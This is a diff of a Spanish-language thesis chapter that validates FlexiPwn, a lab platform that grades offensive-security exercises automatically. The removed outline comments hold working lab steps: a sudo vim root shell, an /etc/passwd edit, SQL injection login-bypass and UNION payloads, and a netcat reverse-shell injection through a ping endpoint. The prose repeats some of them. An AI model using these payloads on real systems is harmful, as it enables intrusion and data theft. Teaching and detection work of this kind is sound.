@@ -1,130 +1,340 @@
 \chapter{Validación}
-\section{Evaluación}
+\label{sec:validacion}
 
-% ===========================================================================
-% BOSQUEJO DE TRABAJO — Por desarrollar a medida que se realicen pruebas
-% reales del sistema (CLCERT, red DCC, escenarios multi-estudiante, etc.).
-%
-% Las secciones 5.1 a 5.3 se podrían añadir ya: los tres escenarios están
-% funcionando en el repo y los walkthroughs ya están redactados en el README
-% del repositorio público.
-%
-% Las secciones 5.4 y 5.5 dependen de pruebas que aún faltan.
-% ===========================================================================
+Este capítulo evalúa en qué medida FlexiPwn cumple el criterio de éxito
+declarado en el Capítulo~\ref{sec:introduccion}: ofrecer validación automática,
+basada en el estado del sistema y sin necesidad de \textit{flags} manuales, para
+ejercicios pertenecientes a varias categorías de seguridad ofensiva. La
+evaluación se organiza en dos planos. El primero comprueba que los escenarios
+funcionan de extremo a extremo: el estudiante ejecuta un \textit{exploit} real y
+los objetivos correspondientes quedan marcados como cumplidos en la base de
+datos sin intervención del educador. Este plano corresponde exactamente al
+criterio de evaluación propuesto en el informe del curso de Introducción al
+Trabajo de Título, que comprometía únicamente verificar la capacidad del sistema
+para generar ejercicios con validación automática en al menos tres categorías.
+El segundo plano examina la robustez del sistema ante condiciones adversas y de
+configuración, y su uso en un entorno más realista (acceso remoto, resistencia y
+contención) a modo de extensión más allá de lo planteado como criterio de éxito.
 
-% ---------------------------------------------------------------------------
-% 5.1 Metodología y criterios de validación
-% ---------------------------------------------------------------------------
-% - Recordar el criterio declarado en el Capítulo 1: validación automática
-%   para al menos tres categorías entre web / database / pwning / forensics /
-%   reversing, sin necesidad de flags manuales.
-% - Describir cómo se valida cada escenario: setup (imagen y configuración),
-%   ejecución del exploit por parte del estudiante, targets esperados,
-%   targets disparados, evidencia capturada (panel SSH, output del REPL).
-% - Aclarar que la validación opera en dos niveles:
-%     (a) los escenarios funcionan y disparan los targets de forma correcta;
-%     (b) el sistema se sostiene bajo uso realista — pruebas pendientes.
+\section{Metodología y criterios de validación}
 
-% ---------------------------------------------------------------------------
-% 5.2 Cobertura del criterio de éxito
-% ---------------------------------------------------------------------------
-% - Tabla resumen con los tres escenarios:
-%     columna 1: escenario
-%     columna 2: categoría (privesc, sqli, network)
-%     columna 3: monitores involucrados (FS, Proc, Log, Red)
-%     columna 4: tipos de target ejercitados
-% - Mostrar que entre los tres se cubren los cuatro monitores y los nodos
-%   lógicos (al menos un escenario con and / or si aplica).
-% - Conectar con el objetivo declarado: "al menos tres categorías".
+El criterio del Capítulo~\ref{sec:introduccion} exige cubrir al menos tres
+categorías de ejercicio con detección automática. La validación funcional se
+apoya en tres escenarios incluidos en el repositorio, cada uno representante de
+una categoría distinta: escalada de privilegios (\textit{pwning}), inyección
+SQL (\textit{web}) e inyección de comandos hacia una \textit{reverse shell}
+(\textit{web}, con énfasis en detección de red). Los tres se cargan desde
+descripciones declarativas en YAML, se validan contra imágenes vulnerables
+construidas para el proyecto y disparan sus objetivos a partir de la actividad
+real del estudiante.
 
-% ---------------------------------------------------------------------------
-% 5.3 Escenarios validados
-% ---------------------------------------------------------------------------
+Cada escenario se valida siguiendo la misma cadena: una descripción YAML define
+el entorno y los objetivos; el estudiante ejecuta el \textit{exploit} desde el
+contenedor atacante; los monitores de la Capa 2 emiten eventos de estado; el
+motor de la Capa~3 evalúa esos eventos contra el árbol de objetivos; y la Capa~4
+persiste el resultado como \texttt{TargetResult} en la base de datos. El runbook
+de pruebas del proyecto documenta esta cadena \texttt{YAML} $\rightarrow$
+\textit{exploit} $\rightarrow$ \texttt{TargetResult} paso a paso, recorriendo
+los cuatro puntos observables (creación del entorno, emisión del evento,
+coincidencia en el motor y persistencia) con el modo verboso de depuración
+activado.
 
-% \subsection{Privilege Escalation vía sudo vim (pwning)}
-%   - Setup: imagen flexipwn/vuln-sudo (sshd + sudo NOPASSWD vim).
-%   - Walkthrough del estudiante:
-%       ssh student-XXXXXX@host -p PORT       (al atacante)
-%       ssh ctfuser@flexipwn-<env>-vulnerable  (al vulnerable)
-%       sudo -l                                (descubre el privilegio)
-%       sudo vim -c ':!bash'                   (escalada)
-%       echo "pwned" > /root/flag.txt          (evidencia)
-%       echo "..." >> /etc/passwd              (modificación)
-%   - Targets disparados:
-%       file_created /root/*.txt
-%       file_modified /etc/passwd
-%       process_running euid=0 cmd=bash ancestor_contains=sudo
-%   - Salida esperada del REPL del educador.
+En este punto conviene separar los dos planos de la validación. El primero, en
+que los escenarios funcionan y disparan sus objetivos correctamente, constituye
+el criterio de evaluación propuesto en el informe del curso de introducción al
+trabajo de título, y se cubre con los tres casos descritos a continuación y con
+el conjunto de \textit{tests}. El segundo, relacionado a un uso realista de
+un aula completa, es una extensión más allá de lo comprometido como evaluación.
+Se aborda parcialmente mediante pruebas unitarias y comprobaciones de la configuración
+de seguridad, y se reconoce explícitamente como trabajo pendiente.
 
-% \subsection{SQL Injection Login Bypass (web)}
-%   - Setup: imagen flexipwn/vuln-sqli-mysql (Flask + MySQL en :5001, general_log on).
-%   - Walkthrough del estudiante:
-%       payload 1: admin' OR '1'='1' --        (bypass clásico)
-%       payload 2: UNION SELECT ... FROM sensitive_data --  (extracción)
-%   - Targets disparados (mezcla log_pattern + network_payload con
-%     capture_filter "port 3306"):
-%       log_pattern OR.*1.*=.*1
-%       log_pattern authentication_success
-%       log_pattern SELECT.*sensitive_data
-%       network_payload OR.*1.*=.*1
-%       network_payload FLAG{sql_injection_detected}
-%   - Discutir cómo logs y red se refuerzan: el mismo payload activa varios
-%     targets por canales independientes.
+\section{Cobertura del criterio de éxito}
 
-% \subsection{Command Injection -> Reverse Shell (network)}
-%   - Setup: imagen flexipwn/vuln-command-injection (Flask /ping?host= + nc).
-%   - Walkthrough del estudiante (necesita dos sesiones SSH al atacante):
-%       Terminal A: nc -lvp 4444
-%       Terminal B: curl ".../ping?host=;nc <attacker> 4444 -e /bin/bash"
-%       Terminal A (ya con la reverse shell): echo "owned" > /root/win.txt
-%   - Targets disparados:
-%       network_connection dst_port=4444
-%       file_created /root/*.txt
-%   - Nota: este escenario justifica el sidecar tcpdump (Capa 2) y la red
-%     externa atacante-host (Capa 1).
+Los tres escenarios validados cubren las tres categorías exigidas y, en
+conjunto, ejercitan los cuatro tipos de monitor de la Capa~2: sistema de
+archivos, procesos, registros (\textit{logs}) y red.
+La Tabla~\ref{tab:cobertura}
+resume esta cobertura. El escenario de inyección SQL es el más completo en
+términos de evaluación lógica: combina objetivos de tipo \texttt{log\_pattern}
+sobre el \textit{log} general de MySQL con objetivos de tipo
+\texttt{network\_payload} sobre el tráfico capturado en el puerto 3306, de modo
+que un mismo \textit{payload} contribuye a varios objetivos por canales
+independientes y la condición de completitud (\texttt{all}) exige cumplir el
+conjunto.
 
-% ---------------------------------------------------------------------------
-% 5.4 Pruebas de robustez del sistema  — PENDIENTES
-% ---------------------------------------------------------------------------
-% Cada uno requiere ejecutar la prueba y registrar el resultado:
-%
-% - Manejo de YAML malformado: validar que Pydantic devuelve un mensaje claro
-%   identificando el campo problemático sin ejecutar el sistema.
-% - Manejo de contenedor caído a mitad del run: verificar que on_stopped lleva
-%   al estado failed o stopped correctamente, y que el daemon no queda colgado.
-% - Manejo de participante duplicado / username repetido.
-% - Manejo de scenario id no encontrado en run start.
-% - Pruebas de batch-start con N estudiantes simultáneos (aula completa):
-%   contar timeouts, fallos por límite de puertos del rango 2200-2299,
-%   contención de la base SQLite.
-% - Tiempo de detección desde el evento (acción del estudiante) hasta la
-%   alerta visible en el REPL del educador. Medir gap real de polling.
-% - "Trampa" en tcpdump: enviar un payload SQLi por fuera del flujo normal del
-%   escenario (por ejemplo, desde una terminal del host atacante con curl
-%   directo) y verificar que el monitor de red lo detecta igualmente.
-% - run reset: verificar que el env_id cambia, que el ExerciseRun se preserva,
-%   que los TargetResult del intento previo quedan con reset_at, y que el
-%   nuevo intento empieza limpio.
-% - exit/Ctrl+D en cliente attached vs daemon stop: comprobar la separación.
+\begin{table}[h]
+\centering
+\caption{Cobertura de categorías y monitores por escenario.}
+\label{tab:cobertura}
+\begin{tabular}{|p{4.5cm}|p{2cm}|p{2cm}|p{5cm}|}
+\hline
+\textbf{Escenario} & \textbf{Categoría} & \textbf{Monitores} &
+\textbf{Tipos de objetivo} \\
+\hline
+Escalada (sudo vim)    & pwning & FS, Proc        &
+\begin{itemize}[nosep, leftmargin=*]
+\item file\_created
+\item file\_modified
+\item process\_running
+\end{itemize} \\
+\hline
+Inyección SQL          & web    & Log, Red        &
+\begin{itemize}[nosep, leftmargin=*]
+\item log\_pattern
+\item network\_payload
+\end{itemize} \\
+\hline
+Inyección de comandos  & web    & Red, FS         &
+\begin{itemize}[nosep, leftmargin=*]
+\item network\_connection
+\item file\_created
+\end{itemize} \\
+\hline
+\end{tabular}
+\end{table}
 
-% ---------------------------------------------------------------------------
-% 5.5 Pruebas en infraestructura real  — PENDIENTES
-% ---------------------------------------------------------------------------
-% - Despliegue en servidor del CLCERT.
-% - Exposición controlada a la red del DCC / la universidad.
-% - Pruebas de aislamiento entre estudiantes:
-%     un estudiante intenta resolver hostnames del entorno de otro
-%     un estudiante intenta egresar al host
-%     un estudiante intenta llegar al daemon FlexiPwn
-% - Pruebas de escape de contenedor (al menos un par de técnicas conocidas):
-%   verificar que el modo rootless contiene el escape como se afirmó en
-%   el Capítulo de Implementación.
-% - Sesión piloto con un grupo de estudiantes reales (si se llega a alcanzar):
-%   medir UX, tiempos de onboarding, fricciones del flujo educador-estudiante.
+Entre los tres escenarios se ejercitan los cuatro monitores y los principales
+tipos de objetivo del motor. Con ello se satisface el criterio
+declarado de cubrir al menos tres categorías con detección automática basada en
+estado, sin que el estudiante deba enviar una \textit{flag} ni el educador deba
+corregir manualmente.
 
-% ---------------------------------------------------------------------------
-% 5.6 Discusión  (cierre del capítulo)
-% ---------------------------------------------------------------------------
-% - Qué demuestran los tres escenarios respecto al criterio del Capítulo 1.
-% - Qué queda como pendiente y cuál es su impacto.
-% - Hilo con el Capítulo de Conclusión: trabajo futuro y reflexión final.
+\section{Escenarios validados}
+
+\subsection{Escalada de privilegios vía sudo vim (pwning)}
+
+El escenario se monta sobre la imagen \texttt{flexipwn/vuln-sudo},
+que ejecuta un
+servidor SSH y concede al usuario \texttt{ctfuser} permiso \texttt{NOPASSWD}
+para ejecutar \texttt{vim} como \textit{root}. El estudiante se conecta primero
+al contenedor atacante con las credenciales del panel SSH, salta desde allí al
+contenedor vulnerable, descubre el privilegio con \texttt{sudo -l} y obtiene una
+\textit{shell} de \textit{root} mediante el \textit{shell-out} de vim
+(\texttt{sudo vim -c ':!bash'}). Con esa \textit{shell} crea un archivo bajo
+\texttt{/root} y modifica \texttt{/etc/passwd}, lo que produce
+evidencia observable de la escalada.
+
+Este escenario dispara tres objetivos: la creación de un archivo bajo
+\texttt{/root} (\texttt{file\_created}), la modificación de \texttt{/etc/passwd}
+(\texttt{file\_modified}) y la presencia de un proceso con \textit{euid}~0 cuyo
+mando es \texttt{bash} y cuyo ancestro incluye \texttt{sudo}
+(\texttt{process\_running}). El monitor de procesos detecta este último en el
+momento en que vim genera la \textit{shell}. El \textit{walkthrough} completo
+del estudiante puede encontrarse en el README del repositorio público.
+
+\subsection{Inyección SQL con \textit{bypass} de \textit{login} (web)}
+
+El escenario emplea la imagen \texttt{flexipwn/vuln-sqli-mysql}, una aplicación
+Flask respaldada por MySQL que escucha en el puerto interno 5001 y mantiene
+activo el \textit{log} general de la base de datos. El estudiante envía dos
+\textit{payloads} desde el atacante mediante \texttt{curl}: un \textit{bypass}
+clásico de autenticación (\texttt{admin' OR '1'='1' -- }) y una consulta
+\texttt{UNION} que extrae datos de una tabla sensible.
+
+La detección combina dos canales. Por un lado, el monitor de \textit{logs}
+observa el \textit{log} general de MySQL y reconoce patrones como la condición
+\texttt{OR 1=1}, la autenticación exitosa y la consulta sobre la tabla de datos
+sensibles. Por otro, el \textit{sidecar} de captura ejecuta
+tcpdump con el filtro
+\texttt{port 3306} y reconoce los mismos patrones, además de la \textit{flag}
+esperada del flujo, directamente en el tráfico hacia MySQL. Esta redundancia
+ilustra cómo \textit{logs} y red se refuerzan: cada \textit{payload} activa
+varios objetivos por vías independientes. El \textit{walkthrough} con los dos
+\textit{payloads} y los seis objetivos asociados está documentado en el README
+del repositorio.
+
+\subsection{Inyección de comandos hacia \textit{reverse shell} (red)}
+
+El tercer escenario usa la imagen \texttt{flexipwn/vuln-command-injection}, una
+aplicación Flask con un \textit{endpoint} \texttt{/ping?host=} vulnerable a
+inyección de comandos. El estudiante necesita dos sesiones SSH al atacante: en
+la primera escucha con \texttt{nc -lvp 4444}, y en la segunda envía un
+\texttt{curl} que inyecta una \textit{reverse shell} contra ese puerto. Cuando
+la conexión inversa se establece, el estudiante crea un archivo bajo
+\texttt{/root} desde la \textit{shell} obtenida.
+
+\begin{sloppypar}
+Los objetivos disparados son la conexión de red saliente hacia el puerto 4444
+(\texttt{network\_connection}) y la creación del archivo de evidencia
+(\texttt{file\_created}). Este escenario justifica de forma concreta dos
+decisiones de arquitectura descritas en capítulos anteriores:
+el \textit{sidecar}
+de captura tcpdump de la Capa~2, necesario para observar la conexión inversa, y
+la red externa entre atacante y \textit{host} de la Capa~1. Además, como los
+escenarios anteriores, el \textit{walkthrough} completo está presente en el
+README del repositorio.
+\end{sloppypar}
+
+\section{Pruebas de robustez del sistema}
+
+\begin{sloppypar}
+La robustez de FlexiPwn se respalda principalmente con un extenso abanico de
+pruebas automatizadas. Este contiene 244 funciones de prueba distribuidas en 23
+archivos bajo \texttt{src/flexipwn/tests/}, que cubren las cuatro capas de la
+arquitectura: provisión de entornos, monitores, motor de evaluación y la capa de
+persistencia y \textit{daemon}. Las pruebas de integración que requieren Docker
+\textit{rootless} en ejecución están marcadas con
+\texttt{pytest.mark.integration}
+y agrupadas en un archivo aparte, de modo que la las pruebas unitarias se
+ejecutan sin la necesidad de levantar contenedores.
+\end{sloppypar}
+
+\subsection{Casos borde cubiertos por pruebas unitarias}
+
+Varios de los escenarios de fallo previstos se cubren a nivel unitario, con
+\textit{mocks} que reproducen la condición sin levantar la infraestructura real.
+La relación entre cada caso borde y la prueba que lo verifica es la
+siguiente:
+
+\begin{enumerate}
+  \item \textbf{Contenedor caído a mitad del \textit{run}.} Cuando el
+        contenedor vulnerable se detiene durante un \textit{run} activo, el
+        sondeo de los monitores de proceso y de sistema de archivos detecta su
+        ausencia y propaga la transición de estado. Lo verifican
+        \texttt{test\_layer2\_process} y \texttt{test\_layer2\_filesystem}.
+  \item \textbf{YAML malformado.} Una descripción inválida, por ejemplo, sin
+        sección de entorno, con un objetivo sin tipo o con una condición no
+        permitida, es rechazada por la validación de esquema de Pydantic sin
+        dejar una fila parcial en la base de datos. Lo cubre
+        \texttt{test\_layer3\_engine}.
+  \item \textbf{Participante duplicado.} El campo de nombre de usuario es único,
+        de modo que una segunda inserción con el mismo nombre levanta un error
+        de integridad. Lo verifica
+        \texttt{test\_db.py::TestParticipantCRUD::test\_username\_unique}.
+  \item \textbf{Colisión de identificador de entorno.} El identificador de
+        entorno es único, dos \textit{runs} con el mismo valor producen un error
+        de integridad en la segunda inserción. Lo cubre
+        \texttt{test\_db.py::TestEnvIdUnique}.
+  \item \begin{sloppypar}\textbf{\textit{Daemon} detenido a mitad del
+        \textit{run}.} Al
+        reiniciarse, el \textit{daemon} reconcilia los \textit{runs} en curso y
+        marca como fallido aquel cuyo contenedor ya no existe. Lo verifica
+        \texttt{test\_daemon\_loop.py::%
+test\_reconcile\_marks\_failed\_when\_container\_missing}. \end{sloppypar}
+\end{enumerate}
+
+Cabe recalcar el alcance de estas pruebas. La validación del esquema, por
+ejemplo, cubre el rechazo del YAML inválido, pero no el mensaje de error que la
+interfaz de línea de comandos presenta al educador. De la misma forma, el
+arranque por lotes de múltiples estudiantes está validado a nivel unitario con
+\textit{mocks}, pero no se ha sometido a carga concurrente real, como se detalla
+en la sección de
+trabajo pendiente.
+
+\subsection{Detección independiente del camino (la ``trampa'' de tcpdump)}
+
+Una propiedad o limitación relevante del monitor de red es que su detección no
+depende del camino que tome el \textit{payload}. El \textit{sidecar} de captura
+comparte el
+espacio de red del contenedor vulnerable y observa todo el tráfico hacia el
+puerto correspondiente, lo haya generado la aplicación web o no. Para
+comprobarlo se diseñó un experimento en el que, en lugar de usar el formulario
+web del escenario de inyección SQL, se envía una consulta SQL directamente al
+puerto 3306 del contenedor vulnerable desde el atacante.
+
+El resultado del 26 de junio de 2026 y registrado en el runbook de
+pruebas confirma este comportamiento. MySQL rechazó
+la conexión del atacante, respondió que el \textit{host} no tenía permiso para
+conectarse, por lo que la consulta nunca llegó a ejecutarse. Sin embargo, los
+bytes de la sentencia \texttt{SELECT} ya habían viajado por TCP hasta el puerto
+3306, y tcpdump los capturó. Los objetivos de red correspondientes pasaron a
+cumplidos sin que se tocara la aplicación web.
+El escenario completo no se da por
+resuelto, porque la condición \texttt{all} exige además los objetivos de
+\textit{log}, que sí requieren el flujo por la aplicación, y la respuesta con la
+información de una tabla ``sensible'', que en este experimento no existió.
+
+En resumen, lo que ocurre es lo siguiente: el detector de red
+reconoce un \textit{patrón} en el tráfico, no la ejecución exitosa del ataque.
+Se podría argumentar que en ese sentido, el sistema se comporta como una regla
+de detección tipo SIEM o SIGMA, que inspecciona la presencia de indicadores en
+el tráfico y no el efecto final sobre el objetivo a vulnerar. Pero al mismo
+tiempo, podría abrir la puerta a falsos positivos si se genera tráfico que
+coincida con los patrones esperados, aunque no haya logrado comprometer la
+aplicación. Por ello, es importante que el educador configure adecuadamente los
+escenarios y los objetivos para minimizar la posibilidad de detecciones
+erróneas.
+
+\subsection{Resistencia y contención del entorno}
+
+La afirmación de que el modo \textit{rootless} contiene un eventual escape de
+contenedor, hecha en el Capítulo~\ref{sec:implementacion}, se respalda con un
+chequeo de configuración ejecutado sobre la infraestructura del CLCERT el 18 de junio
+de 2026. El \textit{script} \texttt{scripts/containment\_check.sh} verifica, de
+forma estrictamente \textit{read-only}, si los vectores asociados a los escapes
+recientes de \texttt{runc} (CVE-2025-31133, CVE-2025-52565 y CVE-2025-52881) y a
+la vulnerabilidad Copy Fail (CVE-2026-31431) están cerrados en la configuración
+desplegada.
+
+El chequeo reportó que esos vectores no son explotables desde el contenedor en
+la configuración verificada. El modo \textit{rootless} encapsula el
+\textit{root} del contenedor a un \textit{namespace}, de modo que un
+escape no aterrizaría como \textit{root} del \textit{host}. La versión de
+\texttt{runc} instalada incorpora los parches correspondientes, y el perfil
+seccomp deniega por defecto la apertura de \textit{sockets} \texttt{AF\_ALG},
+que es la
+superficie que el \textit{exploit} de Copy Fail necesita para arrancar.
+
+Es importante delimitar el alcance de esta comprobación. Se trata de una
+verificación de configuración, no de una prueba de concepto que
+ejecute un \textit{exploit} completo: el \textit{script} no lanza ningún ataque,
+sino que consulta el estado del runtime y de los controles del \textit{kernel}.
+
+\section{Pruebas en infraestructura real}
+
+\subsection{Autoprueba de acceso remoto}
+
+Para validar el despliegue accesible a distancia, se realizó una
+autoprueba con el \textit{script} \texttt{scripts/test\_remote\_access.py}. La
+prueba levanta un entorno publicando el SSH del contenedor atacante únicamente
+en IPs concretas, como la dirección de la red \textit{overlay} de
+\texttt{netbird} \cite{netbird} para acceso remoto, en lugar de exponerlo en todas las
+interfaces. Con el entorno activo,
+se logró establecer la conexión desde otro dispositivo, simulando el rol de 
+un estudiante que accede al contenedor atacante a distancia.
+
+Hay que notar que se trató de una prueba que no involucró estudiantes reales. 
+El experimento valida que el mecanismo de
+publicación selectiva por IP funciona y que el acceso remoto a través de la red
+\textit{overlay} es posible, pero no constituye una evaluación con usuarios del
+curso.
+
+% TODO: incorporar guía de acceso remoto para el CLCERT
+% (docs/acceso-remoto-netbird.md) — pendiente, fuera de esta sesión
+
+\subsection{Trabajo futuro}
+
+En primer lugar, no se ha realizado una sesión piloto con un grupo de
+estudiantes reales ni un despliegue con un curso real. Una prueba de este tipo
+permitiría medir la experiencia de uso, los tiempos de incorporación y las
+fricciones del flujo entre educador y estudiante, pero queda fuera del alcance
+alcanzable en el tiempo disponible.
+
+En segundo lugar, el arranque por lotes de múltiples estudiantes está validado a
+nivel unitario con \textit{mocks}, no bajo carga concurrente real de un grupo
+completo de alumnos. Una prueba de carga real mediría los tiempos de espera, los
+fallos por
+agotamiento del rango de puertos y la robustez de la base de datos SQLite
+cuando varios entornos arrancan en paralelo.
+
+En tercer lugar, las pruebas de aislamiento tal que estudiante no pueda resolver
+los \textit{runs} de otro, y la exposición controlada a la red del DCC quedan
+como verificaciones pendientes en el servidor del CLCERT.
+
+% TODO: añadir mención a nuevos monitores, providers, targets, escenarios y entre eso 
+% (providers probablemente) eBPF.
+
+\section{Discusión}
+
+Los tres escenarios validados demuestran que FlexiPwn satisface el criterio de
+éxito declarado en el Capítulo~\ref{sec:introduccion}: cubren tres categorías de
+ejercicio, ejercitan los cuatro monitores de la Capa~2 y disparan sus objetivos
+a partir del estado real del sistema, sin \textit{flags} manuales ni corrección
+del educador. El conjunto de pruebas automatizadas y las verificaciones en la
+configuración refuerzan esta base, y el experimento de detección independiente
+del camino permite ver tanto la eficacia del monitor de red como sus límites de
+interpretación.
+
+En definitiva, lo que queda pendiente concierne sobre todo al uso del sistema en
+condiciones de aula real: la prueba con estudiantes reales, la carga concurrente
+de un curso completo y la robustez del sistema verificado en producción.
